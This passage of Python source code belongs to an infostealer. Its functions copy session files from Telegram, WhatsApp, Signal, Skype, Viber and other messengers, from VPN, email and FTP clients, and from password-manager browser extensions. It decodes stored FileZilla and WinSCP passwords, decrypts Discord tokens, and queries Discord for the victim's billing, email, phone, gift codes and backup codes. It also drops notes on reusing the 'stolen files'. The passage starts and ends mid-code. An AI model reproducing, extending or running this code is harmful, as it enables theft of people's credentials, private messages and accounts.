                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]

                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                await processes.communicate()

                if not os.path.exists(copy_path):
                    os.makedirs(copy_path)

                for dirs in os.listdir(tg_path):
                    try:
                        _path = os.path.join(tg_path, dirs)
                        if not dirs in black_listed_dirs:
                            if os.path.isfile(_path):
                                shutil.copyfile(_path, os.path.join(copy_path, dirs))
                            elif os.path.isdir(_path):
                                shutil.copytree(_path, os.path.join(copy_path, dirs))
                    except Exception:
                        await error_handler()
                        continue

                if len(os.listdir(copy_path)) == 0:
                    os.rmdir(copy_path)

        except Exception:
            await error_handler()
            pass


    async def StealWhatsApp(self, directory_path: str) -> None:
        try:
            whatsapp_session = os.path.join(directory_path, "Messenger", "WhatsApp")
            os.makedirs(whatsapp_session, exist_ok=True)
            regex_pattern = re.compile(r"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$", re.IGNORECASE)
            parent_folders = [entry for entry in Path(self.LocalAppData, 'Packages').iterdir() if regex_pattern.match(entry.name)]

            for parent in parent_folders:
                local_state_folders = [entry for entry in parent.rglob("LocalState") if entry.is_dir()]
                for local_state_folder in local_state_folders:
                    profile_pictures_folders = [entry for entry in local_state_folder.rglob("profilePictures") if entry.is_dir()]
                    for profile_folder in profile_pictures_folders:
                        destination_path = os.path.join(whatsapp_session, local_state_folder.name, "profilePictures")
                        os.makedirs(destination_path, exist_ok=True)
                        shutil.copytree(profile_folder, destination_path, dirs_exist_ok=True)

                    files_to_copy = [file for file in local_state_folder.rglob("*") if file.is_file() and file.stat().st_size <= 10 * 1024 * 1024 and re.search(r"\.db$|\.db-wal$|\.dat$", file.name)]
                    for file in files_to_copy:
                        dest_folder = os.path.join(whatsapp_session, local_state_folder.name)
                        os.makedirs(dest_folder, exist_ok=True)
                        shutil.copy(file, dest_folder)
                        
        except Exception:
            await error_handler()
            pass

    async def StealSkype(self, directory_path: str) -> None:
        try:
            skype_folder = os.path.join(self.RoamingAppData, "Microsoft", "Skype for Desktop", "Local Storage", "leveldb")
            if os.path.exists(skype_folder):
                copy_path = os.path.join(directory_path, "Messenger", "Skype")
                os.makedirs(copy_path, exist_ok=True)
                if os.path.isdir(skype_folder):shutil.copytree(skype_folder, copy_path, dirs_exist_ok=True)
                else:shutil.copyfile(skype_folder, copy_path)
                
                if len(os.listdir(copy_path)) == 0:
                    os.rmdir(copy_path)
                
        except Exception:
            await error_handler()
            pass

    async def StealSignal(self, directory_path: str) -> None:
        try:
            signal_path = os.path.join(self.RoamingAppData, 'Signal')
            copied_path = os.path.join(directory_path, "Messenger", "Signal")
            if os.path.isdir(signal_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                try:
                    if os.path.exists(Path(signal_path) / "sql"):
                        shutil.copytree(Path(signal_path) / "sql", os.path.join(copied_path, "sql"))
                    if os.path.exists(Path(signal_path) / "attachments.noindex"):
                        shutil.copytree(Path(signal_path) / "attachments.noindex", os.path.join(copied_path, "attachments.noindex"))
                    if os.path.exists(Path(signal_path) / "config.json"):
                        shutil.copy(Path(signal_path) / "config.json", copied_path)
                except Exception:
                    await error_handler()
                    pass
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)

        except Exception:
            await error_handler()
            pass
 
    async def StealElement(self, directory_path: str) -> None:
        try:
            found_element = False
            element_path = os.path.join(self.RoamingAppData, 'Element')
            copied_path = os.path.join(directory_path, "Messenger", "Element")
            if os.path.isdir(element_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                indexed_db_src = Path(element_path) / "IndexedDB"
                local_storage_src = Path(element_path) / "Local Storage"
                try:
                    if os.path.exists(indexed_db_src):
                        shutil.copytree(indexed_db_src, os.path.join(copied_path, "IndexedDB"))
                    if os.path.exists(local_storage_src):
                        shutil.copytree(local_storage_src, os.path.join(copied_path, "Local Storage"))
                    found_element = True
                except Exception:
                    await error_handler()
                    pass
                if found_element:
                    os.mkdir(os.path.join(copied_path, "How to Use"))
                    with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("First, open this file path on your computer <%appdata%\\Element>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Element")
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)
        except Exception:
            await error_handler()
            pass 
   
    async def StealViber(self, directory_path: str) -> None:
        try:
            found_viber = False
            viber_path = os.path.join(self.RoamingAppData, 'ViberPC')
            copied_path = os.path.join(directory_path, "Messenger", "Viber")
            if os.path.isdir(viber_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                pattern = re.compile(r"^(\+?[0-9]{1,12})$")
                directories = [entry for entry in Path(viber_path).iterdir() if entry.is_dir() and pattern.match(entry.name)]
                root_files = [file for file in Path(viber_path).glob("*.db")]

                for root_file in root_files:
                    shutil.copy(root_file, copied_path)

                for directory in directories:
                    destination_path = os.path.join(copied_path, directory.name)
                    shutil.copytree(directory, destination_path)
                    files = [file for file in directory.rglob("*") if file.is_file() and re.search(r"\.db$|\.db-wal$", file.name)]
                    for file in files:
                        dest_file_path = os.path.join(destination_path, file.name)
                        shutil.copy(file, dest_file_path)
                    found_viber = True
                if found_viber:
                    os.mkdir(os.path.join(copied_path, "How to Use"))
                    with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("First, open this file path on your computer <%appdata%\\ViberPC>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Viber")
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)
        except Exception:
            await error_handler()
            pass
  

    async def StealPidgin(self, directory_path: str) -> None:
        try:
            pidgin_folder = os.path.join(self.RoamingAppData, '.purple', "accounts.xml")
            if os.path.exists(pidgin_folder):
                pidgin_accounts = os.path.join(directory_path, "Messenger", "Pidgin")
                os.makedirs(pidgin_accounts, exist_ok=True)
                if pidgin_folder.is_dir():
                    shutil.copytree(pidgin_folder, pidgin_accounts, dirs_exist_ok=True)
                else:
                    shutil.copy2(pidgin_folder, pidgin_accounts)
                if len(os.listdir(pidgin_accounts)) == 0:
                    os.rmdir(pidgin_accounts)
        except Exception:
            await error_handler()
            pass

    async def StealTox(self, directory_path: str) -> None:
        try:
            tox_folder = os.path.join(self.RoamingAppData, 'Tox')
            if os.path.isdir(tox_folder):
                tox_session = os.path.join(directory_path, "Messenger", "Tox")
                os.makedirs(tox_session, exist_ok=True)
                for item in Path(tox_folder).iterdir():
                    if item.is_dir():
                        shutil.copytree(item, tox_session, dirs_exist_ok=True)
                    else:
                        shutil.copy2(item, tox_session)
                if len(os.listdir(tox_session)) == 0:
                    os.rmdir(tox_session)
        except Exception:
            await error_handler()
            pass

    async def StealProtonVPN(self, directory_path: str) -> None:
        try:
            protonvpn_folder = os.path.join(self.LocalAppData, 'ProtonVPN')
            if not os.path.isdir(protonvpn_folder):
                return
            
            async def get_hierarchy(root_dir, pattern):
                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
            protonvpn_account = os.path.join(directory_path, "VPN", 'ProtonVPN')
            os.makedirs(protonvpn_account, exist_ok=True)
            pattern = re.compile(r"^ProtonVPN_Url_[A-Za-z0-9]+$")
            directories = await get_hierarchy(Path(protonvpn_folder), pattern)
            for directory in directories:
                destination_path = os.path.join(protonvpn_account, directory.name)
                if directory.is_dir():
                    shutil.copytree(directory, destination_path, dirs_exist_ok=True)
                else:
                    shutil.copy2(directory, destination_path)
        except Exception:
            await error_handler()
            pass

    async def StealSurfsharkVPN(self, directory_path: str) -> None:
        try:
            surfsharkvpn_folder = os.path.join(self.RoamingAppData, 'Surfshark')
            if not os.path.isdir(surfsharkvpn_folder):
                return
            
            surfsharkvpn_account = os.path.join(directory_path, "VPN", 'Surfshark')
            os.makedirs(surfsharkvpn_account, exist_ok=True)
            files_to_copy = ["data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"]
            for root, _, files in os.walk(surfsharkvpn_folder):
                for file in files:
                    if file in files_to_copy:
                        shutil.copy2(os.path.join(root, file), surfsharkvpn_account)
        except Exception:
            await error_handler()
            pass

    async def StealOpenVPN(self, directory_path: str) -> None:
        try:
            openvpn_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'OpenVPN Connect')
            if not os.path.isdir(openvpn_folder):
                return
            
            openvpn_accounts = os.path.join(directory_path, "VPN", 'OpenVPN')
            os.makedirs(openvpn_accounts, exist_ok=True)
            profiles_src = os.path.join(openvpn_folder, 'profiles')
            config_src = os.path.join(openvpn_folder, 'config.json')

            if Path(profiles_src).is_dir():
                shutil.copytree(Path(profiles_src), openvpn_accounts, dirs_exist_ok=True)
            else:
                shutil.copy2(Path(profiles_src), openvpn_accounts)

            if Path(config_src).is_dir():
                shutil.copytree(Path(config_src), openvpn_accounts, dirs_exist_ok=True)
            else:
                shutil.copy2(Path(config_src), openvpn_accounts)
        except Exception:
            await error_handler()
            pass

    async def BackupThunderbird(self, directory_path: str) -> None:
        try:
            thunderbird_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Thunderbird', 'Profiles')
            if not os.path.isdir(thunderbird_folder):
                return
            
            thunderbird_backup = os.path.join(directory_path, "Email", 'Thunderbird')
            os.makedirs(thunderbird_backup, exist_ok=True)
            pattern = re.compile(r"^[a-z0-9]+\.default-esr$")
            async def get_hierarchy(root_dir, pattern):
                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
            directories = await get_hierarchy(Path(thunderbird_folder), pattern)
            filter_files = ["key4.db", "key3.db", "logins.json", "cert9.db", "*.js"]
            for directory in directories:
                destination_path = os.path.join(thunderbird_backup, directory.name)
                os.makedirs(destination_path, exist_ok=True)
                for file_pattern in filter_files:
                    for file in directory.rglob(file_pattern):
                        relative_path = file.relative_to(directory)
                        dest_file_path = os.path.join(destination_path, relative_path)
                        dest_file_dir = os.path.dirname(dest_file_path)
                        if not os.path.isdir(dest_file_dir):
                            os.makedirs(dest_file_dir, exist_ok=True)
            
                        if file.is_dir():
                            shutil.copytree(file, dest_file_path, dirs_exist_ok=True)
                        else:
                            shutil.copy2(file, dest_file_path)
        except Exception:
            await error_handler()
            pass


    async def BackupMailbird(self, directory_path: str) -> None:
        try:
            mailbird_folder = os.path.join(self.LocalAppData, 'MailBird')
            if not os.path.isdir(mailbird_folder):
                return
            
            mailbird_db = os.path.join(directory_path, "Email", 'MailBird')
            os.makedirs(mailbird_db, exist_ok=True)
            store_db = os.path.join(mailbird_folder, 'Store', 'Store.db')
            if Path(store_db).is_dir():
                shutil.copytree(Path(store_db), mailbird_db, dirs_exist_ok=True)
            else:
                shutil.copy2(Path(store_db), mailbird_db)
    
        except Exception:
            await error_handler()
            pass

    async def StealFileZilla(self, directory_path: str) -> None:
        try:
            filezilla_folder = os.path.join(self.RoamingAppData, 'FileZilla')
            if not os.path.isdir(filezilla_folder):
                return
            
            filezilla_hosts = os.path.join(directory_path, "FTP Clients", 'FileZilla')
            os.makedirs(filezilla_hosts, exist_ok=True)
            recent_servers_xml = os.path.join(filezilla_folder, 'recentservers.xml')
            site_manager_xml = os.path.join(filezilla_folder, 'sitemanager.xml')

            def parse_server_info(xml_content):
                host_match = re.search(r"<Host>(.*?)</Host>", xml_content)
                port_match = re.search(r"<Port>(.*?)</Port>", xml_content)
                user_match = re.search(r"<User>(.*?)</User>", xml_content)
                pass_match = re.search(r"<Pass encoding=\"base64\">(.*?)</Pass>", xml_content)

                server_host = host_match.group(1) if host_match else ""
                server_port = port_match.group(1) if port_match else ""
                server_user = user_match.group(1) if user_match else ""
                if not server_user:
                    return f"Host: {server_host}\nPort: {server_port}\n"
                encoded_pass = pass_match.group(1) if pass_match else ""
                decoded_pass = (encoded_pass and 
                                base64.b64decode(encoded_pass).decode('utf-8') if encoded_pass else "")
                return f"Host: {server_host}\nPort: {server_port}\nUser: {server_user}\nPass: {decoded_pass}\n"

            servers_info = []
            for xml_file in [recent_servers_xml, site_manager_xml]:
                if os.path.isfile(xml_file):
                    with open(xml_file, 'r') as file:
                        xml_content = file.read()
                        server_entries = re.findall(r"<Server>(.*?)</Server>", xml_content, re.DOTALL)
                        for server_entry in server_entries:
                            servers_info.append(parse_server_info(server_entry))

            with open(os.path.join(filezilla_hosts, 'Hosts.txt'), 'w') as file:
                file.write("\n".join(servers_info))
                
            if len(os.listdir(filezilla_hosts)) == 0:
                os.rmdir(filezilla_hosts)
        except Exception:
            await error_handler()
            pass


    async def StealWinSCP(self, directory_path: str) -> None:
        try:
            registry_path = r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
            winscp_session = os.path.join(directory_path, "FTP Clients", 'WinSCP')
            os.makedirs(winscp_session, exist_ok=True)
            output_path = os.path.join(winscp_session, 'WinSCP-sessions.txt')
            output = "WinSCP Sessions\n\n"
            
            def decrypt_winscp_password(hostname, username, password):
                check_flag = 255
                magic = 163
                key = hostname + username
                remaining_pass = password
                flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                stored_flag = flag_and_pass['flag']
                if stored_flag == check_flag:
                    remaining_pass = remaining_pass[2:]
                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                length = flag_and_pass['flag']
                remaining_pass = remaining_pass[(flag_and_pass['flag'] * 2):]
                final_output = ""
                for _ in range(length):
                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                    final_output += chr(flag_and_pass['flag'])
                if stored_flag == check_flag:
                    return final_output[len(key):]
                return final_output

            def decrypt_next_character_winscp(remaining_pass):
                magic = 163
                firstval = "0123456789ABCDEF".index(remaining_pass[0]) * 16
                secondval = "0123456789ABCDEF".index(remaining_pass[1])
                added = firstval + secondval
                decrypted_result = ((~(added ^ magic)) + 256) % 256
                return {'flag': decrypted_result, 'remaining_pass': remaining_pass[2:]}

            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path) as reg_key:
                    index = 0
                    while True:
                        try:
                            session_name = winreg.EnumKey(reg_key, index)
                            session_path = f"{registry_path}\\{session_name}"
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, session_path) as session_key:
                                hostname = winreg.QueryValueEx(session_key, 'HostName')[0]
                                username = winreg.QueryValueEx(session_key, 'UserName')[0]
                                encrypted_password = winreg.QueryValueEx(session_key, 'Password')[0]
                                password = decrypt_winscp_password(hostname, username, encrypted_password)
                                output += f"Session  : {session_name}\nHostname : {hostname}\nUsername : {username}\nPassword : {password}\n\n"
                        except OSError:
                            break
                        index += 1
            except OSError:
                await error_handler()

            with open(output_path, 'w') as file:
                file.write(output)

        except OSError:
            await error_handler()
        except Exception:
            await error_handler()


    async def StealPasswordManagers(self, directory_path: str) -> None:
        try:
            browser_paths = {
                "Brave": os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
                "Chrome": os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
                "Chromium": os.path.join(self.LocalAppData, "Chromium", "User Data"),
                "Edge": os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
                "EpicPrivacy": os.path.join(self.LocalAppData, "Epic Privacy Browser", "User Data"),
                "Iridium": os.path.join(self.LocalAppData, "Iridium", "User Data"),
                "Opera": os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
                "OperaGX": os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),
                "Vivaldi": os.path.join(self.LocalAppData, "Vivaldi", "User Data"),
                "Yandex": os.path.join(self.LocalAppData, "Yandex", "YandexBrowser", "User Data")
            }

            password_mgr_dirs = {
                "aeblfdkhhhdcdjpifhhbdiojplfjncoa": "1Password",
                "eiaeiblijfjekdanodkjadfinkhbfgcd": "NordPass",
                "fdjamakpfbbddfjaooikfcpapjohcfmg": "DashLane",
                "nngceckbapebfimnlniiiahkandclblb": "Bitwarden",
                "pnlccmojcmeohlpggmfnbbiapkmbliob": "RoboForm",
                "bfogiafebfohielmmehodmfbbebbbpei": "Keeper",
                "cnlhokffphohmfcddnibpohmkdfafdli": "MultiPassword",
                "oboonakemofpalcgghocfoadofidjkkk": "KeePassXC",
                "hdokiejnpimakedhajhdlcegeplioahd": "LastPass",
                "imloifkgjagghnncjkhggdhalmcnfklk": "Trezor",
            }

            for browser_name, browser_path in browser_paths.items():
                if os.path.exists(browser_path):
                    for root, dirs, files in os.walk(browser_path):
                        if "Local Extension Settings" in dirs:
                            local_extensions_settings_dir = os.path.join(root, "Local Extension Settings")
                            for password_mgr_key, password_manager in password_mgr_dirs.items():
                                extension_path = os.path.join(local_extensions_settings_dir, password_mgr_key)
                                if os.path.exists(extension_path):
                                    password_mgr_browser = f"{password_manager} ({browser_name})"
                                    password_dir_path = os.path.join(directory_path, "Password Managers", password_mgr_browser)
                                    os.makedirs(password_dir_path, exist_ok=True)
                                    if Path(extension_path).is_dir():
                                        shutil.copytree(Path(extension_path), password_dir_path, dirs_exist_ok=True)
                                    else:
                                        shutil.copy2(Path(extension_path), password_dir_path)
                                    location_file = os.path.join(password_dir_path, "Location.txt")
                                    with open(location_file, 'w') as loc_file:
                                        loc_file.write(f"Copied {password_manager} from {extension_path} to {password_dir_path}")
            if len(os.listdir(password_dir_path)) == 0:
                os.rmdir(password_dir_path)
        except Exception:
            await error_handler()









    async def StealDiscord(self) -> None:
        try:
            baddglist = [
                {"N": 'Active_Developer', 'V': 4194304, 'E': 'Active Developer '},
                {"N": 'Early_Verified_Bot_Developer', 'V': 131072, 'E': "Verified Bot Developer "},
                {"N": 'Bug_Hunter_Level_2', 'V': 16384, 'E': "Bug Hunter Lvl 2 "},
                {"N": 'Early_Supporter', 'V': 512, 'E': "Early Supporter "},
                {"N": 'House_Balance', 'V': 256, 'E': "House Balance "},
                {"N": 'House_Brilliance', 'V': 128, 'E': "House Brilliance "},
                {"N": 'House_Bravery', 'V': 64, 'E': "House Bravery "},
                {"N": 'Bug_Hunter_Level_1', 'V': 8, 'E': "Bug Hunter Lvl 1 "},
                {"N": 'HypeSquad_Events', 'V': 4, 'E': "HypeSquad "},
                {"N": 'Partnered_Server_Owner', 'V': 2, 'E': "Partnered Server Owner "},
                {"N": 'Discord_Employee', 'V': 1, 'E': "Discord Employee "}
            ]

            async def UhqGuild(token) -> str:
                try:
                    uhq = []
                    headers = {
                        "Authorization": token,
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }
                    async with aiohttp.ClientSession() as session:
                        async with session.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers) as response:
                            guilds = await response.json()

                    for guild in guilds:
                        if guild["approximate_member_count"] < 30 or not (guild["owner"] or guild["permissions"] == "4398046511103"):
                            continue
                        
                        async with aiohttp.ClientSession() as session:
                            async with session.get(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers) as response:
                                invites = await response.json()

                        link = invites[0]['code'] if invites else None

                        uhq.append(f"[{guild['name']}]({f'https://discord.gg/{link}' if link else ''}) ({guild['id']}) {guild['approximate_member_count']} Members")

                    return '\n'.join(uhq) if uhq else "No HQ Guilds"
                except Exception:
                    await error_handler()
                    return "No HQ Guilds"


            async def GetUhqFriend(token, max_friends=5) -> str:
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }
                    url = "https://discord.com/api/v6/users/@me/relationships"
                    
                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                        async with session.get(url, headers=headers) as response:
                            friendlist = await response.json()


                    uhqlist = ''
                    friend_count = 0 

                    for friend in friendlist:
                        OwnedBadges = ''
                        flags = friend['user']['public_flags']
                        for badge in baddglist:
                            if flags // badge["V"] != 0 and friend['type'] == 1:
                                if not "House" in badge["N"] and not badge["N"] == "Active_Developer":
                                    OwnedBadges += badge["E"]
                                flags = flags % badge["V"]
                        if OwnedBadges != '':
                            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
                    return uhqlist if uhqlist != '' else "No HQ Friends"
                except Exception:
                    await error_handler()

            def GetBadge(flags):
                if flags == 0:
                    return ''

                owned_badges = ''
                for badge in baddglist:
                    if flags // badge["V"] != 0:
                        owned_badges += badge["E"]
                        flags = flags % badge["V"]
                return owned_badges

            async def GetTokenInfo(token):
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }
                    url = "https://discord.com/api/v6/users/@me"
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, headers=headers) as response:
                            user_info = await response.json()

                    username = user_info["username"]

                    globalusername = 'None'
                    if "global_name" in user_info:
                        globalusername = user_info["global_name"]

                    bio = "None"
                    if "bio" in user_info:
                        bio = user_info["bio"]
                        if len(bio) > 70:
                            bio = bio[:67] + "..."

                    nsfw = ""
                    if "nsfw_allowed" in user_info:
                        nsfw = user_info["nsfw_allowed"]
                        if nsfw == "False":
                            nsfw = "False"
                        else:
                            nsfw = "True"
                            
                    hashtag = user_info["discriminator"]
                    email = user_info.get(f"email", "")
                    user_id = user_info["id"]

                    flags = user_info[f"public_flags"]
                    nitros = "No Nitro"
                    phone = "No Phone"

                    if "premium_type" in user_info:
                        nitros = user_info["premium_type"]
                        if nitros == 1:
                            nitros = "Nitro Classic "
                        elif nitros == 2:
                            nitros = "Nitro Boost "
                        elif nitros == 3:
                            nitros =  "Nitro Basic "

                    if "phone" in user_info:
                        phone = f'`{user_info["phone"]}`'

                    return username, globalusername, bio, nsfw, hashtag, email, user_id, flags, nitros, phone
                except Exception:
                    await error_handler()


            async def CheckToken(token) -> bool:
                headers = {
                    "Authorization": token,
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                }

                url = "https://discord.com/api/v6/users/@me"
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, headers=headers) as response:
                            if response.status == 401:
                                return False
                            else:
                                return True
                except Exception:
                    await error_handler()
                    return False

            async def GetBilling(token):
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }

                    url = "https://discord.com/api/users/@me/billing/payment-sources"
                    try:
                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                            async with session.get(url, headers=headers) as response:
                                response_text = await response.text()
                                billing_json = json.loads(response_text)

                    except Exception:
                        await error_handler()
                        return False
                    
                    if not billing_json:
                        return "False"
                    
                    billing = ""
                    for method in billing_json:
                        if not method["invalid"]:
                            if method["type"] == 1:
                                billing += "Credit Card "
                            elif method["type"] == 2:
                                billing += "PayPal "
                            elif method["type"] == 17:
                                billing += "CashApp "
                    return billing
                except Exception:
                    await error_handler()

            async def GetBack() -> None:
                try:
                    path = os.environ["HOMEPATH"]
                    code_path = '\\Downloads\\discord_backup_codes.txt'
                    if os.path.exists(path + code_path):
                        with open(path + code_path, 'r', encoding='utf-8') as file:
                            backup = file.readlines()
                            
                        return backup
                            
                except Exception:
                    await error_handler()
                    return 'No backup code saved'
                
            async def GetDiscordConnection(token) -> None:
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }

                    async with aiohttp.ClientSession() as session:
                        async with session.get("https://discord.com/api/v6/users/@me/connections", headers=headers) as response:
                            if response.status == 200:
                                data = await response.json()

                                Services = {
                                    "battlenet": "https://battle.net",
                                    "ebay": "https://ebay.com",
                                    "epicgames": "https://epicgames.com",
                                    "facebook": "https://facebook.com",
                                    "github": "https://github.com",
                                    "instagram": "https://instagram.com",
                                    "leagueoflegends": "https://leagueoflegends.com",
                                    "paypal": "https://paypal.com",
                                    "playstation": "https://playstation.com",
                                    "reddit": "https://reddit.com",
                                    "riotgames": "https://riotgames.com",
                                    "spotify": "https://spotify.com",
                                    "skype": "https://skype.com",
                                    "steam": "https://store.steampowered.com",
                                    "tiktok": "https://tiktok.com",
                                    "twitch": "https://twitch.tv",
                                    "twitter": "https://twitter.com",
                                    "xbox": "https://xbox.com",
                                    "youtube": "https://youtube.com"
                                }

                                connections_list = []
                                for connection in data:
                                    connections_list.append(f"Username: {connection['name']}\nServices : [{connection['type']}]({Services.get(connection['type'], 'Unknown')})\n")
                                return connections_list
                            else:
                                return []
                except Exception:
                    await error_handler()
        
            async def GetGift(token) -> None:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}) as response:
                            if response.status == 200:
                                gift_codes = await response.json()
                                if gift_codes:
                                    codes = []
                                    for code in gift_codes:
                                        name = code['promotion']['outbound_title']
                                        code_value = code['code']
                                        data = f"Name: {name}\nCode: {code_value}"
                                        codes.append(data)
                                    return '\n\n'.join(codes) if codes else 'No Gift'
                                else:
                                    return 'No Gift'
                            else:
                                return 'No Gift'
                except Exception:
                    await error_handler()
            processed_tokens = []
            processed_id = []
            async def UploadToken(token, path) -> None:
                try:
                    if token in processed_tokens:
                        return
                    
                    processed_tokens.append(token)
                    username, globalusername, bio, nsfw, hashtag, email, user_id, flags, nitro, phone = await GetTokenInfo(token)
                
                    if user_id in processed_id:
                        return
                 
                    processed_id.append(user_id)                    
                 
                    back = await GetBack()
                    billing = await GetBilling(token)
                    badge = GetBadge(flags)
                    friends = await GetUhqFriend(token)
                    guild = await UhqGuild(token)
                    gift = await GetGift(token)
                    connections = await GetDiscordConnection(token)

                    if isinstance(connections, list):
                        connections_str = "\n".join(connections) if connections else 'No Connections'
                    else:
                        connections_str = 'No Connections'
                    if friends == '':
                        friends = "No Rare Friends"
                    if not billing:
                        billing = "No Billing"
                    if not badge:
                        badge = "No Badge"
                    if not phone: 
                        phone = "No Phone"
                    if hashtag == '0':
                        hashtag = ''
                    
                except Exception:
                    await error_handler()
                else:
                    ListFonction.discord.append(f"Token: {token}\nPath: {path}\nUser: {username}#{hashtag} ({user_id}) Global Username : {globalusername}\nPhone: {phone}\nEmail: {email}\nNsfw Enable?: {nsfw}\nBadge: {nitro}{badge}\nBilling: {billing}\nBiography: {bio}\nHQ Friends: {friends}\nGuilds: {guild}\nConnection: {connections_str}\nGift: {gift}\nBackup Code: {back}\n==============================================\n")

                            
            tokens = []
            async def GetToken(path, arg):
                try:
                    if not os.path.exists(path):
                        return

                    path += arg

                    for file in os.listdir(path):
                        if file.endswith(".log") or file.endswith(".ldb"):
                            with open(f"{path}\\{file}", 'r', errors="ignore") as f:
                                for line in [x.strip() for x in f.readlines() if x.strip()]:
                                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                                        for token in re.findall(regex, line):
                                            if await CheckToken(token):
                                                if token not in tokens:
                                                    tokens.append(token)
                                                    await UploadToken(token, path)

                except Exception:
                    await error_handler()

            async def GetDiscord(path, arg):
                try:
                    if not os.path.exists(f"{path}/Local State"):
                        return

                    pathC = path + arg
                    pathKey = path + "/Local State"

                    with open(pathKey, 'r', encoding='utf-8') as f:
                        local_state = json.loads(f.read())

                    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    master_key = WindowsApi.CryptUnprotectData(master_key[5:])

                    for file in os.listdir(pathC):
                        if file.endswith(".log") or file.endswith(".ldb"):
                            with open(f"{pathC}\\{file}", 'r', errors="ignore") as f:
                                for line in [x.strip() for x in f.readlines() if x.strip()]:
                                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                        TokenDecoded = WindowsApi.Decrpytion(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                                        if await CheckToken(TokenDecoded):
                                            if TokenDecoded not in tokens:
                                                tokens.append(TokenDecoded)
                                                await UploadToken(TokenDecoded, path)

                except Exception:
                    await error_handler()

            browserPaths = [        
                [f"{self.RoamingAppData}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
                [f"{self.RoamingAppData}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
                [f"{self.RoamingAppData}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
                [f"{self.LocalAppData}/Google/Chrome/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
                [f"{self.LocalAppData}/Google/Chrome SxS/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
                [f"{self.LocalAppData}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
